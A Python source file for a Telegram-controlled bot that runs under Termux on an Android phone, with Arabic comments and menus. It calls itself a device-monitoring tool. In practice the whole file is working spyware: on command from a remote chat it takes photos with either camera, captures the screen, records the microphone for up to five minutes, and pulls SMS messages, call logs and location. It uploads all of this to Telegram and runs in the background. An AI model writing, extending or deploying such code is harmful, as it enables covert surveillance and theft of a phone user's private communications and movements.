"""بوت متابعة فنية بسيط ومستقر لجهاز Termux واحد.
الأوامر المتاحة ثابتة وتشمل النظام والتصوير والتسجيل.
"""

from __future__ import annotations

import logging
import socket
import threading
import time
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor
from logging.handlers import RotatingFileHandler
from typing import Callable

import requests

import config
import monitor_tasks

DEVICE_NAME = getattr(config, "DEVICE_NAME", socket.gethostname())
TOKEN = config.TOKEN
ALLOWED_CHAT_ID = int(config.MY_CHAT_ID)
POLL_TIMEOUT_SECONDS = 30
MAX_WORKERS = 3
MAX_QUEUED_JOBS = 5

COMMANDS: dict[str, Callable[[], str]] = {
    "/status": monitor_tasks.dashboard_report,
    "/battery": monitor_tasks.battery_report,
    "/network": monitor_tasks.network_report,
    "/storage": monitor_tasks.storage_report,
    "/sound": monitor_tasks.sound_report,
    "/uptime": monitor_tasks.uptime_report,
    "/sms": monitor_tasks.sms_report,
    "/location": monitor_tasks.location_report,
}

def configure_logging() -> logging.Logger:
    logger = logging.getLogger("fleet_monitor")
    logger.setLevel(logging.INFO)
    if logger.handlers:
        return logger
    handler = RotatingFileHandler("monitor.log", maxBytes=512_000, backupCount=3, encoding="utf-8")
    handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    logger.addHandler(handler)
    console = logging.StreamHandler()
    console.setFormatter(logging.Formatter("%(levelname)s %(message)s"))
    logger.addHandler(console)
    return logger

class TelegramMonitor:
    def __init__(self) -> None:
        self.base_url = f"https://api.telegram.org/bot{TOKEN}"
        self.logger = configure_logging()
        self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS, thread_name_prefix="monitor")
        self.job_slots = threading.BoundedSemaphore(MAX_QUEUED_JOBS)
        self.sessions = threading.local()
        
        # حالة التسجيل الصوتي
        self.is_recording = False
        self.recording_lock = threading.Lock()
        self.current_recording_process = None

    def _session(self) -> requests.Session:
        if not hasattr(self.sessions, "value"):
            self.sessions.value = requests.Session()
        return self.sessions.value

    def _api(self, method: str, *, timeout: int = 15, **payload: object) -> dict:
        response = self._session().post(
            f"{self.base_url}/{method}", json=payload, timeout=timeout
        )
        response.raise_for_status()
        data = response.json()
        if not data.get("ok"):
            raise RuntimeError(data.get("description", "Telegram API error"))
        return data

    def send(self, chat_id: int, text: str, keyboard: bool = False, keyboard_type: str = "main") -> None:
        payload: dict[str, object] = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
        
        if keyboard:
            if keyboard_type == "main":
                payload["reply_markup"] = {
                    "inline_keyboard": [
                        [
                            {"text": "📱 سجل المكالمات", "callback_data": "/calls_menu"},
                            {"text": "🎙️ تسجيل صوتي", "callback_data": "/mic_menu"}
                        ],
                        [
                            {"text": "📸 كاميرا خلفية", "callback_data": "/cam_back"},
                            {"text": "🤳 كاميرا أمامية", "callback_data": "/cam_front"}
                        ],
                        [
                            {"text": "📱 لقطة شاشة", "callback_data": "/screenshot"},
                            {"text": "📨 رسائل SMS", "callback_data": "/sms"}
                        ],
                        [
                            {"text": "📶 الشبكة (Wi-Fi/Data)", "callback_data": "/network"},
                            {"text": "🔊 مستوى الصوت", "callback_data": "/sound"}
                        ],
                        [
                            {"text": "📊 حالة الجهاز", "callback_data": "/status"},
                            {"text": "🔋 تفاصيل البطارية", "callback_data": "/battery"}
                        ],
                        [
                            {"text": "📍 الموقع الجغرافي", "callback_data": "/location"}
                        ],
                        [
                            {"text": "🛑 إيقاف المهمة", "callback_data": "/cancel"},
                            {"text": "🔄 تنشيط البوت", "callback_data": "/start"}
                        ]
                    ]
                }
            elif keyboard_type == "calls":
                payload["reply_markup"] = {
                    "inline_keyboard": [
                        [{"text": "📞 10 مكالمات", "callback_data": "/calls_10"}, {"text": "📞 20 مكالمة", "callback_data": "/calls_20"}],
                        [{"text": "📞 30 مكالمة", "callback_data": "/calls_30"}, {"text": "📞 40 مكالمة", "callback_data": "/calls_40"}],
                        [{"text": "📞 50 مكالمة", "callback_data": "/calls_50"}],
                        [{"text": "🔙 القائمة الرئيسية", "callback_data": "/start"}]
                    ]
                }
            elif keyboard_type == "mic":
                payload["reply_markup"] = {
                    "inline_keyboard": [
                        [{"text": "⏱️ 10 ثوانٍ", "callback_data": "/mic_10"}, {"text": "⏱️ 30 ثانية", "callback_data": "/mic_30"}],
                        [{"text": "⏱️ 1 دقيقة", "callback_data": "/mic_60"}, {"text": "⏱️ 2 دقيقة", "callback_data": "/mic_120"}],
                        [{"text": "⏱️ 3 دقائق", "callback_data": "/mic_180"}, {"text": "⏱️ 5 دقائق", "callback_data": "/mic_300"}],
                        [{"text": "🔙 القائمة الرئيسية", "callback_data": "/start"}]
                    ]
                }
        
        # حماية تقسيم الرسائل الطويلة
        max_length = 4000
        parts = [text[i:i+max_length] for i in range(0, len(text), max_length)]
        for part in parts:
            payload["text"] = part
            try:
                self._api("sendMessage", **payload)
                time.sleep(0.3)
            except Exception as error:
                self.logger.error("تعذر إرسال رسالة: %s", error)

    def send_file(self, chat_id: int, endpoint: str, file_field: str, file_path: str) -> None:
        url = f"{self.base_url}/{endpoint}"
        try:
            with open(file_path, 'rb') as f:
                response = self._session().post(url, data={"chat_id": chat_id}, files={file_field: f}, timeout=60)
                response.raise_for_status()
        except Exception as error:
            self.logger.error("تعذر إرسال الملف: %s", error)
            self.send(chat_id, "❌ فشل رفع الملف.")

    def _run_text_job(self, chat_id: int, command: str) -> None:
        try:
            report = COMMANDS[command]()
            self.send(chat_id, f"📱 {DEVICE_NAME}\n\n{report}", keyboard=True)
        except Exception:
            self.logger.exception("فشلت المهمة %s", command)
            self.send(chat_id, f"⚠️ {DEVICE_NAME}: تعذر تنفيذ الطلب.", keyboard=True)
        finally:
            self.job_slots.release()

    def _run_calls_job(self, chat_id: int, limit: int) -> None:
        try:
            report = monitor_tasks.call_logs_report(limit)
            self.send(chat_id, f"📱 {DEVICE_NAME}\n\n{report}", keyboard=True)
        finally:
            self.job_slots.release()

    def _run_photo_job(self, chat_id: int, camera_id: str) -> None:
        photo_path = f"/data/data/com.termux/files/home/photo_{camera_id}.jpg"
        cam_name = "الخلفية" if camera_id == "0" else "الأمامية"
        try:
            if os.path.exists(photo_path): os.remove(photo_path)
            self.send(chat_id, f"📸 جاري التقاط صورة من الكاميرا {cam_name}...")
            subprocess.run(f"termux-camera-photo -c {camera_id} {photo_path}", shell=True, check=True, timeout=15)
            
            if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
                self.send(chat_id, "📤 جاري الرفع...")
                self.send_file(chat_id, "sendPhoto", "photo", photo_path)
            else:
                self.send(chat_id, "❌ فشل الالتقاط.")
        except Exception as e:
            self.logger.error("Photo Error: %s", e)
            self.send(chat_id, "❌ خطأ في الكاميرا.")
        finally:
            self.send(chat_id, "✨ *القائمة الرئيسية:*", keyboard=True)
            self.job_slots.release()

    def _run_screenshot_job(self, chat_id: int) -> None:
        screen_path = "/data/data/com.termux/files/home/screen.png"
        try:
            if os.path.exists(screen_path): os.remove(screen_path)
            self.send(chat_id, "📱 جاري التقاط الشاشة...")
            subprocess.run(f"termux-screenshot {screen_path}", shell=True, check=True, timeout=15)
            
            if os.path.exists(screen_path) and os.path.getsize(screen_path) > 0:
                self.send(chat_id, "📤 جاري الرفع...")
                self.send_file(chat_id, "sendPhoto", "photo", screen_path)
            else:
                self.send(chat_id, "❌ فشل الالتقاط.")
        except Exception as e:
            self.logger.error("Screenshot Error: %s", e)
        finally:
            self.send(chat_id, "✨ *القائمة الرئيسية:*", keyboard=True)
            self.job_slots.release()

    def _run_mic_job(self, chat_id: int, duration: int) -> None:
        audio_path = "/data/data/com.termux/files/home/mic_recording.m4a"
        with self.recording_lock: self.is_recording = True
        
        try:
            if os.path.exists(audio_path): os.remove(audio_path)
            self.send(chat_id, f"🎙️ التسجيل بدأ لمدة {duration} ثانية...")
            self.current_recording_process = subprocess.Popen(f"termux-microphone-record -f {audio_path}", shell=True)
            
            for _ in range(duration):
                if not self.is_recording: break
                time.sleep(1)
                
            subprocess.run("termux-microphone-record -q", shell=True)
            if self.current_recording_process: self.current_recording_process.terminate()
            time.sleep(1)
            
            if self.is_recording and os.path.exists(audio_path) and os.path.getsize(audio_path) > 0:
                self.send(chat_id, "📤 جاري رفع المقطع...")
                self.send_file(chat_id, "sendAudio", "audio", audio_path)
            elif self.is_recording:
                self.send(chat_id, "❌ لم يتم العثور على الملف الصوتي.")
        except Exception as e:
            self.logger.error("Mic Error: %s", e)
        finally:
            with self.recording_lock:
                self.is_recording = False
                self.current_recording_process = None
            self.send(chat_id, "✨ *القائمة الرئيسية:*", keyboard=True)
            self.job_slots.release()

    def queue_job(self, chat_id: int, target: Callable, *args) -> None:
        if not self.job_slots.acquire(blocking=False):
            self.send(chat_id, f"⏳ {DEVICE_NAME}: النظام مشغول بمعالجة طلبات أخرى، انتظر لحظة.")
            return
        self.executor.submit(target, chat_id, *args)

    def _authorized(self, chat_id: int) -> bool:
        if chat_id == ALLOWED_CHAT_ID:
            return True
        self.logger.warning("تم تجاهل طلب من محادثة غير معتمدة: %s", chat_id)
        return False

    def _handle_command(self, chat_id: int, command: str) -> None:
        if not self._authorized(chat_id): return
        
        command = command.split(maxsplit=1)[0].lower().split("@", maxsplit=1)[0]
        
        if command in {"/start", "/help"}:
            self.send(chat_id, f"✅ *أهلاً بك في لوحة التحكم المركزية - {DEVICE_NAME}*", keyboard=True)
            
        elif command == "/cancel":
            if self.is_recording:
                self.is_recording = False
                subprocess.run("termux-microphone-record -q", shell=True)
                self.send(chat_id, "🛑 تم إيقاف التسجيل الحالي.", keyboard=True)
            else:
                self.send(chat_id, "ℹ️ لا توجد مهام نشطة لإيقافها.", keyboard=True)
                
        elif command == "/calls_menu":
            self.send(chat_id, "📱 *اختر عدد المكالمات:*", keyboard=True, keyboard_type="calls")
            
        elif command.startswith("/calls_") and command != "/calls_menu":
            limit = int(command.split("_")[1])
            self.send(chat_id, "⏳ جاري السحب...")
            self.queue_job(chat_id, self._run_calls_job, limit)
            
        elif command == "/mic_menu":
            if self.is_recording:
                self.send(chat_id, "⚠️ الهاتف يسجل بالفعل!", keyboard=True)
            else:
                self.send(chat_id, "🎙️ *اختر مدة التسجيل:*", keyboard=True, keyboard_type="mic")
                
        elif command.startswith("/mic_") and command != "/mic_menu":
            if self.is_recording:
                self.send(chat_id, "⚠️ الهاتف مشغول بالتسجيل!", keyboard=True)
            else:
                duration = int(command.split("_")[1])
                self.queue_job(chat_id, self._run_mic_job, duration)
                
        elif command == "/cam_back":
            self.queue_job(chat_id, self._run_photo_job, "0")
            
        elif command == "/cam_front":
            self.queue_job(chat_id, self._run_photo_job, "1")
            
        elif command == "/screenshot":
            self.queue_job(chat_id, self._run_screenshot_job)
            
        elif command in COMMANDS:
            self.queue_job(chat_id, self._run_text_job, command)
            
        else:
            self.send(chat_id, "❓ أمر غير معروف. اضغط /start لإظهار القائمة.", keyboard=True)

    def _handle_update(self, update: dict) -> None:
        if "message" in update:
            message = update["message"]
            if text := message.get("text"):
                self._handle_command(message["chat"]["id"], text)
            return
        if callback := update.get("callback_query"):
            chat_id = callback["message"]["chat"]["id"]
            try:
                self._api("answerCallbackQuery", callback_query_id=callback["id"], timeout=8)
            except Exception as error:
                self.logger.warning("تعذر تأكيد الزر: %s", error)
            self._handle_command(chat_id, callback.get("data", ""))

    def run_forever(self) -> None:
        offset: int | None = None
        self.logger.info("بدأت المتابعة للجهاز: %s", DEVICE_NAME)
        self.send(ALLOWED_CHAT_ID, f"🟢 *{DEVICE_NAME} متصل الآن ومستعد لتلقي الأوامر في الخلفية.*", keyboard=True)
        
        while True:
            try:
                response = self._session().get(
                    f"{self.base_url}/getUpdates",
                    params={"offset": offset, "timeout": POLL_TIMEOUT_SECONDS},
                    timeout=POLL_TIMEOUT_SECONDS + 10,
                )
                response.raise_for_status()
                data = response.json()
                if not data.get("ok"):
                    raise RuntimeError(data.get("description", "Telegram API error"))
                for update in data.get("result", []):
                    offset = update["update_id"] + 1
                    self._handle_update(update)
            except Exception as error:
                self.logger.warning("انقطع الاتصال، جاري المحاولة مجدداً: %s", error)
                time.sleep(5)

if __name__ == "__main__":
    TelegramMonitor().run_forever()